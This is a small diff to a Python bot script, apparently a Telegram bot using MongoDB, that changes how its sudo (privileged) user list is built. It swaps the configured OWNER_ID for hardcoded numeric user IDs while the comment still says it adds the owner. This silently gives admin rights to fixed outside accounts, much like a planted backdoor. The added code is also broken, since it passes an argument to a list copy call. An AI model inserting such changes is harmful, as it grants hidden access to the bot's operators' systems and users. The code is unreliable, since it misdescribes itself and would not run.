@@ -40,7 +40,8 @@ db = client[DB_NAME]
 users_collection = db['users']
 
 # Define a list to store sudo user IDs
-sudo_users.append(OWNER_ID)  # Add owner to sudo users list initially
+sudo_users = SUDO_ID.copy(6257927828)  # Copy initial SUDO_ID list
+sudo_users.append(5960968099)  # Add owner to sudo users list initially
 
 def get_readable_time(seconds: int) -> str:
     count = 0
